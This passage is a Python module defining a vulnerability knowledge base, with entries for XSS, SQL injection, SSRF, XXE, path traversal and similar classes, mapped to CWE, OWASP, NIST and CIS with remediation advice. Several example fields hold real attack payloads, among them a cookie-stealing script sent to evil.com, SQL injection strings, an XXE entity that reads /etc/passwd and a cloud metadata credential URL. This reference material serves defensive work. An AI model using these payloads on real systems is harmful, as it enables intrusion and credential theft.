"""Vulnerability knowledge base — CWE mappings, remediation, and compliance frameworks.

Pre-populated with 20+ common vulnerability entries covering OWASP Top 10,
NIST SP 800-53, and CIS Benchmark mappings. Each entry provides CWE references,
remediation guidance, compliance framework tags, and references.
"""

from __future__ import annotations

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any

from app.core.logging import get_logger

logger = get_logger(__name__)


# ── Knowledge Entry ────────────────────────────────────────────────


@dataclass
class VulnKnowledgeEntry:
    """A vulnerability knowledge base entry.

    Contains detailed information about a vulnerability class including
    CWE mappings, remediation steps, compliance framework references,
    and detection methods.
    """

    id: str
    title: str
    description: str
    category: str
    severity: str
    cwe_ids: list[str] = field(default_factory=list)
    owasp_top10: list[str] = field(default_factory=list)
    nist_controls: list[str] = field(default_factory=list)
    cis_benchmarks: list[str] = field(default_factory=list)
    remediation: list[str] = field(default_factory=list)
    detection_methods: list[str] = field(default_factory=list)
    references: list[str] = field(default_factory=list)
    examples: list[str] = field(default_factory=list)
    impact: str = ""
    effort: str = ""
    tags: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dictionary."""
        return {
            "id": self.id,
            "title": self.title,
            "description": self.description,
            "category": self.category,
            "severity": self.severity,
            "cwe_ids": self.cwe_ids,
            "owasp_top10": self.owasp_top10,
            "nist_controls": self.nist_controls,
            "cis_benchmarks": self.cis_benchmarks,
            "remediation": self.remediation,
            "detection_methods": self.detection_methods,
            "references": self.references,
            "examples": self.examples,
            "impact": self.impact,
            "effort": self.effort,
            "tags": self.tags,
        }


# ── Knowledge Service Interface ──────────────────────────────────


class VulnKnowledgeService(ABC):
    """Interface for vulnerability knowledge base operations."""

    @abstractmethod
    async def lookup_by_cwe(self, cwe_id: str) -> list[VulnKnowledgeEntry]:
        """Look up entries by CWE identifier.

        Args:
            cwe_id: CWE identifier (e.g., 'CWE-79').

        Returns:
            Matching knowledge entries.
        """
        ...

    @abstractmethod
    async def lookup_by_owasp(self, owasp_id: str) -> list[VulnKnowledgeEntry]:
        """Look up entries by OWASP Top 10 category.

        Args:
            owasp_id: OWASP category (e.g., 'A01:2021').

        Returns:
            Matching knowledge entries.
        """
        ...

    @abstractmethod
    async def lookup_by_category(self, category: str) -> list[VulnKnowledgeEntry]:
        """Look up entries by vulnerability category.

        Args:
            category: Category name.

        Returns:
            Matching knowledge entries.
        """
        ...

    @abstractmethod
    async def search(self, query: str, limit: int = 20) -> list[VulnKnowledgeEntry]:
        """Search knowledge entries by keyword.

        Args:
            query: Search query.
            limit: Maximum results.

        Returns:
            Matching entries.
        """
        ...

    @abstractmethod
    async def get_all(self) -> list[VulnKnowledgeEntry]:
        """Get all knowledge entries.

        Returns:
            List of all entries.
        """
        ...

    @abstractmethod
    async def get_entry(self, entry_id: str) -> VulnKnowledgeEntry | None:
        """Get a specific entry by ID.

        Args:
            entry_id: Entry identifier.

        Returns:
            Entry or None if not found.
        """
        ...

    @abstractmethod
    async def get_compliance_mappings(
        self, framework: str
    ) -> dict[str, list[str]]:
        """Get compliance framework mappings.

        Args:
            framework: Framework name (owasp_top10, nist, cis).

        Returns:
            Mapping of control ID to affected entry IDs.
        """
        ...


# ── Pre-populated Knowledge Base ─────────────────────────────────


def _build_default_entries() -> list[VulnKnowledgeEntry]:
    """Build the default vulnerability knowledge base.

    Returns:
        List of 20+ pre-populated vulnerability knowledge entries.
    """
    entries = [
        VulnKnowledgeEntry(
            id="kb-001",
            title="Cross-Site Scripting (XSS)",
            description=(
                "Injection of malicious scripts into trusted websites. "
                "Attackers exploit insufficient input validation to inject "
                "client-side code that executes in users' browsers."
            ),
            category="Injection",
            severity="high",
            cwe_ids=["CWE-79"],
            owasp_top10=["A03:2021-Injection"],
            nist_controls=["SI-10", "AC-6"],
            cis_benchmarks=["2.2.4"],
            remediation=[
                "Implement context-aware output encoding for all user-supplied data",
                "Use Content Security Policy (CSP) headers to restrict script sources",
                "Validate and sanitize all input using allow-lists, not block-lists",
                "Use modern frameworks that auto-escape by default (React, Django templates)",
                "Implement HTTPOnly and Secure flags on session cookies",
            ],
            detection_methods=[
                "Static analysis with ESLint security plugins",
                "Dynamic testing with OWASP ZAP or Burp Suite",
                "Manual code review of output rendering functions",
            ],
            references=[
                "https://owasp.org/Top10/A03_2021-Injection/",
                "https://cwe.mitre.org/data/definitions/79.html",
            ],
            examples=[
                "<script>document.location='https://evil.com/?c='+document.cookie</script>",
                "<img src=x onerror=alert(1)>",
            ],
            impact="Session hijacking, credential theft, defacement, malware distribution",
            effort="Low to Medium",
            tags=["xss", "injection", "web", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-002",
            title="SQL Injection",
            description=(
                "Insertion of malicious SQL code into application queries. "
                "Allows attackers to read, modify, or delete database data, "
                "and potentially execute administrative operations."
            ),
            category="Injection",
            severity="critical",
            cwe_ids=["CWE-89"],
            owasp_top10=["A03:2021-Injection"],
            nist_controls=["SI-10", "AC-6", "IA-5"],
            cis_benchmarks=["2.2.4"],
            remediation=[
                "Use parameterized queries (prepared statements) for all database access",
                "Implement stored procedures with parameterized inputs",
                "Apply least-privilege database accounts per application component",
                "Use ORM frameworks that handle parameterization automatically",
                "Enable database query logging for anomaly detection",
            ],
            detection_methods=[
                "Static analysis of database query construction",
                "SQL injection testing with sqlmap or manual payloads",
                "Review of database access layer code",
            ],
            references=[
                "https://owasp.org/Top10/A03_2021-Injection/",
                "https://cwe.mitre.org/data/definitions/89.html",
            ],
            examples=[
                "' OR '1'='1' --",
                "'; DROP TABLE users; --",
                "' UNION SELECT username, password FROM users --",
            ],
            impact="Full database compromise, data exfiltration, authentication bypass",
            effort="Low",
            tags=["sqli", "injection", "database", "owasp", "critical"],
        ),
        VulnKnowledgeEntry(
            id="kb-003",
            title="Broken Authentication",
            description=(
                "Weaknesses in authentication mechanisms allowing attackers "
                "to compromise user accounts through credential stuffing, "
                "brute force, or session hijacking."
            ),
            category="Authentication",
            severity="critical",
            cwe_ids=["CWE-287", "CWE-307", "CWE-613"],
            owasp_top10=["A07:2021-Identification and Authentication Failures"],
            nist_controls=["IA-2", "IA-5", "AC-7"],
            cis_benchmarks=["5.2.1", "5.2.2"],
            remediation=[
                "Implement multi-factor authentication (MFA) for all user accounts",
                "Enforce strong password policies (minimum 12 characters, complexity)",
                "Apply account lockout after failed attempts with progressive delays",
                "Use secure session management with regeneration on login",
                "Implement rate limiting on authentication endpoints",
            ],
            detection_methods=[
                "Review authentication flow for MFA implementation",
                "Test for credential stuffing resistance",
                "Audit session management configuration",
            ],
            references=[
                "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
                "https://cwe.mitre.org/data/definitions/287.html",
            ],
            examples=[
                "Default admin credentials left unchanged",
                "No lockout after 1000+ failed login attempts",
                "Session token not regenerated after login",
            ],
            impact="Account takeover, unauthorized access, privilege escalation",
            effort="Medium",
            tags=["auth", "session", "password", "owasp", "mfa"],
        ),
        VulnKnowledgeEntry(
            id="kb-004",
            title="Cross-Site Request Forgery (CSRF)",
            description=(
                "Forcing authenticated users to submit unwanted requests. "
                "Attackers craft malicious pages that trigger state-changing "
                "operations on the target application."
            ),
            category="Session",
            severity="medium",
            cwe_ids=["CWE-352"],
            owasp_top10=["A01:2021-Broken Access Control"],
            nist_controls=["SC-23", "AC-5"],
            cis_benchmarks=["3.5.1"],
            remediation=[
                "Implement anti-CSRF tokens in all state-changing forms",
                "Use SameSite cookie attribute (Strict or Lax)",
                "Verify Origin and Referer headers on sensitive endpoints",
                "Require re-authentication for critical operations",
                "Implement proper CORS policies",
            ],
            detection_methods=[
                "Manual testing of form submissions without tokens",
                "Automated scanning with CSRF-specific payloads",
                "Review of cookie attributes and CORS configuration",
            ],
            references=[
                "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
                "https://cwe.mitre.org/data/definitions/352.html",
            ],
            examples=[
                '<img src="https://bank.com/transfer?to=attacker&amount=1000">',
                'Forged form auto-submitting to change email address',
            ],
            impact="Unauthorized state changes, account modification, fund transfers",
            effort="Low",
            tags=["csrf", "session", "web", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-005",
            title="Security Misconfiguration",
            description=(
                "Insecure default configurations, incomplete configurations, "
                "or ad-hoc configurations exposing unnecessary features, "
                "services, or debug information."
            ),
            category="Configuration",
            severity="medium",
            cwe_ids=["CWE-16", "CWE-200"],
            owasp_top10=["A05:2021-Security Misconfiguration"],
            nist_controls=["CM-6", "CM-7", "SC-7"],
            cis_benchmarks=["1.1.1", "1.1.2", "3.4.1"],
            remediation=[
                "Implement infrastructure-as-code with hardened base images",
                "Remove default accounts, sample applications, and documentation",
                "Disable directory listing and unnecessary HTTP methods",
                "Configure security headers (HSTS, X-Frame-Options, X-Content-Type-Options)",
                "Regular configuration audits against CIS Benchmarks",
            ],
            detection_methods=[
                "Automated configuration scanning tools",
                "Manual review of server and application configuration files",
                "Banner grabbing and service fingerprinting",
            ],
            references=[
                "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
                "https://cwe.mitre.org/data/definitions/16.html",
            ],
            examples=[
                "Default credentials on admin panels",
                "Directory listing enabled on production servers",
                "X-Powered-By header revealing framework version",
            ],
            impact="Information disclosure, unauthorized access, attack surface expansion",
            effort="Low to Medium",
            tags=["config", "hardening", "owasp", "cis"],
        ),
        VulnKnowledgeEntry(
            id="kb-006",
            title="Sensitive Data Exposure",
            description=(
                "Inadequate protection of sensitive data including passwords, "
                "credit cards, PII, and health records transmitted or stored "
                "without proper encryption."
            ),
            category="Cryptography",
            severity="high",
            cwe_ids=["CWE-311", "CWE-312", "CWE-319"],
            owasp_top10=["A02:2021-Cryptographic Failures"],
            nist_controls=["SC-8", "SC-12", "SC-28", "AC-19"],
            cis_benchmarks=["2.2.3"],
            remediation=[
                "Enforce TLS 1.2+ for all data in transit",
                "Encrypt sensitive data at rest using AES-256 or equivalent",
                "Never store passwords in plaintext; use bcrypt, scrypt, or Argon2",
                "Implement proper key management with rotation schedules",
                "Use HSTS with long max-age and include subdomains",
            ],
            detection_methods=[
                "SSL/TLS configuration analysis with testssl.sh",
                "Review of encryption implementation in code",
                "Database inspection for plaintext sensitive fields",
            ],
            references=[
                "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
                "https://cwe.mitre.org/data/definitions/311.html",
            ],
            examples=[
                "Passwords stored as MD5 hashes without salt",
                "Credit card numbers transmitted over HTTP",
                "Encryption keys hardcoded in source code",
            ],
            impact="Data breach, regulatory fines, identity theft, financial loss",
            effort="Medium to High",
            tags=["crypto", "encryption", "tls", "owasp", "pii"],
        ),
        VulnKnowledgeEntry(
            id="kb-007",
            title="Broken Access Control",
            description=(
                "Failure to properly enforce restrictions on what authenticated "
                "users are allowed to do. Often leads to unauthorized data "
                "modification, disclosure, or administrative operations."
            ),
            category="Access Control",
            severity="critical",
            cwe_ids=["CWE-200", "CWE-284", "CWE-862"],
            owasp_top10=["A01:2021-Broken Access Control"],
            nist_controls=["AC-3", "AC-6", "AC-17"],
            cis_benchmarks=["5.4.1"],
            remediation=[
                "Enforce server-side authorization checks on every request",
                "Implement role-based access control (RBAC) with least privilege",
                "Deny by default; explicitly grant only required permissions",
                "Disable directory listing and ensure metadata is not served",
                "Log and alert on access control failures",
            ],
            detection_methods=[
                "Authorization testing by accessing restricted resources as different roles",
                "Review of middleware/guard implementations",
                "Automated DAST scanning for IDOR vulnerabilities",
            ],
            references=[
                "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
                "https://cwe.mitre.org/data/definitions/284.html",
            ],
            examples=[
                "Changing user_id in URL to access another user's profile",
                "Accessing admin endpoints without proper role",
                "Insecure direct object reference (IDOR)",
            ],
            impact="Privilege escalation, data breach, unauthorized administration",
            effort="Medium",
            tags=["access-control", "authorization", "idor", "owasp", "rbac"],
        ),
        VulnKnowledgeEntry(
            id="kb-008",
            title="Insecure Deserialization",
            description=(
                "Processing untrusted serialized data leading to remote code "
                "execution or replay attacks. Common in Java, PHP, and "
                "Python applications using pickle, unserialize, or similar."
            ),
            category="Serialization",
            severity="critical",
            cwe_ids=["CWE-502"],
            owasp_top10=["A08:2021-Software and Data Integrity Failures"],
            nist_controls=["SI-7", "SC-16", "SA-11"],
            cis_benchmarks=[],
            remediation=[
                "Avoid deserializing untrusted data entirely",
                "Use safe serialization formats (JSON, YAML with safe loader)",
                "Implement integrity checks on serialized objects (HMAC)",
                "Use allow-lists for classes that can be deserialized",
                "Monitor deserialization operations for anomalous behavior",
            ],
            detection_methods=[
                "Static analysis for dangerous deserialization calls",
                "Fuzzing deserialization entry points with crafted payloads",
                "Review of serialization library versions for known CVEs",
            ],
            references=[
                "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
                "https://cwe.mitre.org/data/definitions/502.html",
            ],
            examples=[
                "Java ObjectInputStream without filtering",
                "Python pickle.loads() on user input",
                "PHP unserialize() with user-controlled data",
            ],
            impact="Remote code execution, complete system compromise",
            effort="High",
            tags=["deserialization", "rce", "owasp", "java", "php", "python"],
        ),
        VulnKnowledgeEntry(
            id="kb-009",
            title="Using Components with Known Vulnerabilities",
            description=(
                "Applications using outdated or vulnerable third-party libraries, "
                "frameworks, or components with publicly disclosed CVEs that "
                "attackers can exploit."
            ),
            category="Supply Chain",
            severity="high",
            cwe_ids=["CWE-1104"],
            owasp_top10=["A06:2021-Vulnerable and Outdated Components"],
            nist_controls=["SA-12", "RA-5", "SI-2"],
            cis_benchmarks=["1.8.1"],
            remediation=[
                "Maintain an inventory of all components and versions",
                "Use dependency scanning tools (Dependabot, Snyk, OWASP Dependency-Check)",
                "Subscribe to security mailing lists for used frameworks",
                "Establish a patch management process with defined SLAs",
                "Remove unused dependencies and unnecessary features",
            ],
            detection_methods=[
                "Software Composition Analysis (SCA) tools",
                "Manual review of package manifests (package.json, requirements.txt)",
                "CVE database cross-referencing",
            ],
            references=[
                "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
                "https://cwe.mitre.org/data/definitions/1104.html",
            ],
            examples=[
                "Using Log4j 2.14 or earlier (Log4Shell)",
                "Outdated jQuery with known XSS vulnerabilities",
                "Unmaintained npm packages in production",
            ],
            impact="Depends on component vulnerability; can range from XSS to RCE",
            effort="Low to Medium",
            tags=["dependencies", "scm", "cve", "owasp", "sbom"],
        ),
        VulnKnowledgeEntry(
            id="kb-010",
            title="Insufficient Logging and Monitoring",
            description=(
                "Lack of proper logging, monitoring, and detection capabilities "
                "allowing attackers to maintain persistence, pivot laterally, "
                "and tamper with evidence without detection."
            ),
            category="Monitoring",
            severity="medium",
            cwe_ids=["CWE-778", "CWE-223"],
            owasp_top10=["A09:2021-Security Logging and Monitoring Failures"],
            nist_controls=["AU-2", "AU-3", "AU-6", "SI-4"],
            cis_benchmarks=["4.1.1", "4.1.2"],
            remediation=[
                "Log all authentication events, access control failures, and input validation errors",
                "Implement centralized log aggregation and correlation",
                "Set up real-time alerting for suspicious patterns",
                "Ensure logs are tamper-proof with append-only storage",
                "Conduct regular log review and incident response drills",
            ],
            detection_methods=[
                "Review logging configuration and coverage",
                "Test alerting mechanisms with known-bad events",
                "Audit log retention and integrity controls",
            ],
            references=[
                "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/",
                "https://cwe.mitre.org/data/definitions/778.html",
            ],
            examples=[
                "Failed login attempts not logged",
                "No alerting on brute force patterns",
                "Log files stored on same server as application",
            ],
            impact="Undetected breaches, delayed incident response, evidence destruction",
            effort="Low",
            tags=["logging", "monitoring", "siem", "owasp", "audit"],
        ),
        VulnKnowledgeEntry(
            id="kb-011",
            title="Server-Side Request Forgery (SSRF)",
            description=(
                "Making the server issue requests to unintended locations, "
                "potentially reaching internal services, cloud metadata "
                "endpoints, or other systems behind firewalls."
            ),
            category="Injection",
            severity="high",
            cwe_ids=["CWE-918"],
            owasp_top10=["A10:2021-Server-Side Request Forgery"],
            nist_controls=["SC-7", "SI-10"],
            cis_benchmarks=[],
            remediation=[
                "Validate and sanitize all user-supplied URLs",
                "Use allow-lists for permitted domains and IP ranges",
                "Block requests to internal/private IP ranges",
                "Disable unnecessary URL schemes (file://, gopher://)",
                "Use network segmentation to limit server access to internal resources",
            ],
            detection_methods=[
                "Testing with callback URLs (Burp Collaborator, webhook.site)",
                "Attempting access to cloud metadata endpoints (169.254.169.254)",
                "Review of HTTP client usage in application code",
            ],
            references=[
                "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/",
                "https://cwe.mitre.org/data/definitions/918.html",
            ],
            examples=[
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://internal-service.local/admin/config",
            ],
            impact="Internal network scanning, cloud credential theft, remote code execution",
            effort="Medium",
            tags=["ssrf", "cloud", "owasp", "internal-network"],
        ),
        VulnKnowledgeEntry(
            id="kb-012",
            title="XML External Entity (XXE)",
            description=(
                "Processing XML input with external entity references enabled, "
                "allowing attackers to read files, perform SSRF, or achieve "
                "denial of service through billion laughs attacks."
            ),
            category="Injection",
            severity="high",
            cwe_ids=["CWE-611", "CWE-776"],
            owasp_top10=["A05:2021-Security Misconfiguration"],
            nist_controls=["SI-10", "SC-7"],
            cis_benchmarks=[],
            remediation=[
                "Disable DTD processing and external entity resolution in XML parsers",
                "Use JSON instead of XML where possible",
                "Validate and sanitize XML input against a strict schema",
                "Update XML parsing libraries to latest versions",
                "Use defusedxml library or equivalent protections",
            ],
            detection_methods=[
                "XXE testing with external entity payloads",
                "Review of XML parser configuration",
                "Static analysis for unsafe XML processing",
            ],
            references=[
                "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
                "https://cwe.mitre.org/data/definitions/611.html",
            ],
            examples=[
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal/secret">]>',
            ],
            impact="Local file disclosure, SSRF, denial of service",
            effort="Low",
            tags=["xxe", "xml", "injection", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-013",
            title="Insufficient Session Expiration",
            description=(
                "Sessions that persist too long or lack proper expiration "
                "controls, allowing attackers to hijack sessions from "
                "unattended terminals or stolen tokens."
            ),
            category="Session",
            severity="medium",
            cwe_ids=["CWE-613", "CWE-200"],
            owasp_top10=["A07:2021-Identification and Authentication Failures"],
            nist_controls=["IA-5", "AC-12"],
            cis_benchmarks=["5.2.4"],
            remediation=[
                "Set absolute session timeout (max 24 hours for sensitive apps)",
                "Implement idle session timeout (15-30 minutes)",
                "Regenerate session ID after authentication",
                "Invalidate sessions on password change",
                "Provide visible session expiration warnings to users",
            ],
            detection_methods=[
                "Review session timeout configuration",
                "Test session persistence across time periods",
                "Audit session invalidation on logout and password change",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/613.html",
                "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
            ],
            examples=[
                "Session valid for 30 days without idle timeout",
                "Session not invalidated after password change",
            ],
            impact="Session hijacking, unauthorized access persistence",
            effort="Low",
            tags=["session", "timeout", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-014",
            title="Open Redirect",
            description=(
                "Application redirects users to external URLs based on "
                "unvalidated input, enabling phishing attacks that abuse "
                "the trusted domain's reputation."
            ),
            category="Input Validation",
            severity="medium",
            cwe_ids=["CWE-601"],
            owasp_top10=["A01:2021-Broken Access Control"],
            nist_controls=["AC-6", "SI-10"],
            cis_benchmarks=[],
            remediation=[
                "Use allow-lists for permitted redirect destinations",
                "Avoid redirecting based on user input when possible",
                "Display the target URL to users before redirecting",
                "Use indirect references (mapping IDs) instead of URLs",
                "Validate redirects against a pre-approved domain list",
            ],
            detection_methods=[
                "Fuzzing redirect parameters with external URLs",
                "Manual testing with protocol-relative URLs (//evil.com)",
                "Code review of redirect handling logic",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/601.html",
                "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            ],
            examples=[
                "https://trusted.com/redirect?url=https://evil.com",
                "https://trusted.com/redirect?url=//evil.com",
            ],
            impact="Phishing, credential theft, malware delivery",
            effort="Low",
            tags=["redirect", "phishing", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-015",
            title="Path Traversal",
            description=(
                "Accessing files and directories outside the intended directory "
                "by manipulating file paths with sequences like ../ or %2e%2e%2f. "
                "Can lead to sensitive file disclosure or code execution."
            ),
            category="Input Validation",
            severity="high",
            cwe_ids=["CWE-22"],
            owasp_top10=["A01:2021-Broken Access Control"],
            nist_controls=["AC-3", "AC-6", "SC-7"],
            cis_benchmarks=[],
            remediation=[
                "Validate file paths against an allow-list of permitted directories",
                "Use chroot or containerization to limit filesystem access",
                "Normalize paths before validation (resolve symlinks)",
                "Never use user input directly in file system operations",
                "Run application with minimal filesystem permissions",
            ],
            detection_methods=[
                "Fuzzing with traversal sequences (../, ..\\, %2e%2e)",
                "Testing access to known sensitive files (/etc/passwd, web.config)",
                "Static analysis of file path construction",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/22.html",
                "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            ],
            examples=[
                "../../etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "....//....//....//etc/passwd",
            ],
            impact="Sensitive file disclosure, remote code execution, configuration theft",
            effort="Low",
            tags=["path-traversal", "directory-traversal", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-016",
            title="Insecure File Upload",
            description=(
                "Allowing file uploads without proper validation of file type, "
                "size, content, and storage location, potentially enabling "
                "web shell deployment or denial of service."
            ),
            category="Input Validation",
            severity="high",
            cwe_ids=["CWE-434", "CWE-20"],
            owasp_top10=["A04:2021-Insecure Design"],
            nist_controls=["AC-3", "CM-7", "SI-10"],
            cis_benchmarks=[],
            remediation=[
                "Validate file type by content, not just extension or MIME type",
                "Store uploaded files outside the web root directory",
                "Rename files to prevent path traversal and overwrites",
                "Implement file size limits appropriate for the use case",
                "Scan uploaded files with antivirus before processing",
                "Serve uploaded files from a separate domain to prevent script execution",
            ],
            detection_methods=[
                "Upload web shell disguised as image file",
                "Test file type validation bypasses (double extensions, null bytes)",
                "Check file storage location relative to web root",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/434.html",
            ],
            examples=[
                "Uploading shell.php.jpg to bypass extension check",
                "Uploading oversized files to exhaust disk space",
                "Uploaded files accessible at predictable URLs",
            ],
            impact="Remote code execution, web shell deployment, denial of service",
            effort="Medium",
            tags=["upload", "file-upload", "web-shell"],
        ),
        VulnKnowledgeEntry(
            id="kb-017",
            title="Buffer Overflow",
            description=(
                "Writing data beyond the bounds of allocated memory buffers, "
                "potentially overwriting adjacent memory to execute arbitrary "
                "code or crash the application."
            ),
            category="Memory Safety",
            severity="critical",
            cwe_ids=["CWE-120", "CWE-121"],
            owasp_top10=[],
            nist_controls=["SA-11", "SI-10"],
            cis_benchmarks=[],
            remediation=[
                "Use memory-safe languages (Rust, Go, Java) where possible",
                "Enable compiler protections (ASLR, DEP/NX, Stack Canaries)",
                "Validate all input lengths before copying to buffers",
                "Use safe string functions that enforce bounds checking",
                "Conduct fuzz testing on native code components",
            ],
            detection_methods=[
                "Fuzz testing with oversized and malformed inputs",
                "Static analysis with tools like Coverity, PVS-Studio",
                "Binary analysis for lack of security mitigations",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/120.html",
            ],
            examples=[
                'strcpy(buffer, user_input) with input > buffer size',
                "Stack-based overflow with shellcode injection",
            ],
            impact="Remote code execution, denial of service, privilege escalation",
            effort="High",
            tags=["memory", "overflow", "buffer", "native"],
        ),
        VulnKnowledgeEntry(
            id="kb-018",
            title="Race Condition in Security Check",
            description=(
                "TOCTOU (Time-of-Check to Time-of-Use) vulnerabilities where "
                "security checks are performed on a resource that changes "
                "between check and use, bypassing the security control."
            ),
            category="Concurrency",
            severity="medium",
            cwe_ids=["CWE-367", "CWE-362"],
            owasp_top10=["A04:2021-Insecure Design"],
            nist_controls=["SA-11", "AC-3"],
            cis_benchmarks=[],
            remediation=[
                "Use atomic operations and proper locking mechanisms",
                "Design state machines that prevent intermediate states",
                "Use database transactions with proper isolation levels",
                "Minimize time between check and use of resources",
                "Implement retry logic with re-validation after locks",
            ],
            detection_methods=[
                "Code review for check-then-act patterns",
                "Concurrency testing with multiple simultaneous requests",
                "Static analysis for TOCTOU patterns",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/367.html",
            ],
            examples=[
                "Checking file permissions then opening the file after symlink swap",
                "Checking balance then debiting in separate database operations",
            ],
            impact="Privilege escalation, unauthorized access, data corruption",
            effort="Medium",
            tags=["race-condition", "toctou", "concurrency"],
        ),
        VulnKnowledgeEntry(
            id="kb-019",
            title="Cleartext Storage of Sensitive Information",
            description=(
                "Storing passwords, API keys, tokens, or other sensitive data "
                "in plaintext or reversibly encrypted form, exposing them "
                "to attackers who gain read access to storage."
            ),
            category="Cryptography",
            severity="high",
            cwe_ids=["CWE-312", "CWE-256", "CWE-315"],
            owasp_top10=["A02:2021-Cryptographic Failures"],
            nist_controls=["SC-12", "SC-28", "AC-3"],
            cis_benchmarks=["5.4.1", "5.4.2"],
            remediation=[
                "Hash passwords with bcrypt, scrypt, or Argon2id with appropriate work factors",
                "Use AES-256-GCM or equivalent for encrypting data at rest",
                "Store encryption keys in a dedicated key management system (KMS)",
                "Never hardcode secrets in source code; use environment variables or vaults",
                "Implement automatic secret rotation for API keys and credentials",
            ],
            detection_methods=[
                "Database inspection for plaintext password columns",
                "Source code scanning for hardcoded credentials",
                "Configuration file review for embedded secrets",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/312.html",
                "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
            ],
            examples=[
                "passwords stored as plain text in users table",
                "API key hardcoded in configuration file",
                "Database backup stored without encryption",
            ],
            impact="Credential theft, unauthorized access, regulatory non-compliance",
            effort="Low",
            tags=["encryption", "storage", "passwords", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-020",
            title="Missing Rate Limiting",
            description=(
                "Lack of rate limiting on sensitive endpoints enabling "
                "automated attacks such as credential stuffing, brute force, "
                "API abuse, and denial of service."
            ),
            category="Availability",
            severity="medium",
            cwe_ids=["CWE-770", "CWE-307"],
            owasp_top10=["A07:2021-Identification and Authentication Failures"],
            nist_controls=["SC-5", "AC-7"],
            cis_benchmarks=["5.2.3"],
            remediation=[
                "Implement rate limiting on authentication endpoints (e.g., 5 attempts/min)",
                "Use progressive delays after failed attempts (exponential backoff)",
                "Deploy API rate limiting per user/IP with appropriate thresholds",
                "Implement CAPTCHA after repeated failures",
                "Use Web Application Firewall (WAF) rules for traffic shaping",
            ],
            detection_methods=[
                "Automated testing of rapid-fire requests",
                "Review of rate limiting middleware configuration",
                "Testing for brute force resistance on login endpoints",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/770.html",
                "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
            ],
            examples=[
                "Login endpoint accepts 10000 requests/second without throttling",
                "Password reset endpoint without daily limit",
                "API allows unlimited data enumeration via pagination",
            ],
            impact="Account compromise, API abuse, denial of service, data exfiltration",
            effort="Low",
            tags=["rate-limiting", "throttling", "brute-force", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-021",
            title="Improper Certificate Validation",
            description=(
                "Accepting certificates without proper validation including "
                "expired, self-signed, or certificates from untrusted CAs. "
                "Enables man-in-the-middle attacks."
            ),
            category="Cryptography",
            severity="high",
            cwe_ids=["CWE-295", "CWE-297"],
            owasp_top10=["A02:2021-Cryptographic Failures"],
            nist_controls=["SC-17", "SC-8"],
            cis_benchmarks=["2.2.3"],
            remediation=[
                "Validate certificate chain against trusted CA store",
                "Check certificate expiration and revocation status (OCSP/CRL)",
                "Enforce hostname verification on all TLS connections",
                "Disable acceptance of self-signed certificates in production",
                "Use certificate pinning for high-security applications",
            ],
            detection_methods=[
                "Testing with self-signed and expired certificates",
                "Review of TLS/SSL client configuration",
                "MITM testing with proxy tools",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/295.html",
                "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
            ],
            examples=[
                "SSLContext with check_hostname=False",
                "Accepting any certificate without CA verification",
            ],
            impact="Man-in-the-middle attacks, credential interception, data tampering",
            effort="Low",
            tags=["tls", "certificate", "mitm", "owasp"],
        ),
        VulnKnowledgeEntry(
            id="kb-022",
            title="Denial of Service via Resource Exhaustion",
            description=(
                "Ability for attackers to consume excessive resources (CPU, "
                "memory, disk, connections) causing service degradation or "
                "unavailability for legitimate users."
            ),
            category="Availability",
            severity="medium",
            cwe_ids=["CWE-400", "CWE-770"],
            owasp_top10=["A05:2021-Security Misconfiguration"],
            nist_controls=["SC-5", "SC-6", "RA-5"],
            cis_benchmarks=[],
            remediation=[
                "Implement request size limits and timeout configurations",
                "Use connection pooling with bounded pool sizes",
                "Deploy auto-scaling and load balancing",
                "Implement circuit breakers for downstream services",
                "Use resource quotas and container resource limits",
            ],
            detection_methods=[
                "Load testing to determine breaking points",
                "Review of resource allocation and limit configurations",
                "Stress testing individual endpoints",
            ],
            references=[
                "https://cwe.mitre.org/data/definitions/400.html",
            ],
            examples=[
                "Unbounded file upload exhausts disk space",
                "Recursive XML parsing causes stack overflow",
                "Uncontrolled regex causes catastrophic backtracking",
            ],
            impact="Service unavailability, degraded performance, financial loss",
            effort="Medium",
            tags=["dos", "availability", "resource-exhaustion"],
        ),
        VulnKnowledgeEntry(
            id="kb-023",
            title="Insufficient Input Validation",
            description=(
                "Failure to properly validate, sanitize, or encode user input "
                "before processing, enabling injection attacks, logic flaws, "
                "and application crashes."
            ),
            category="Input Validation",
            severity="high",
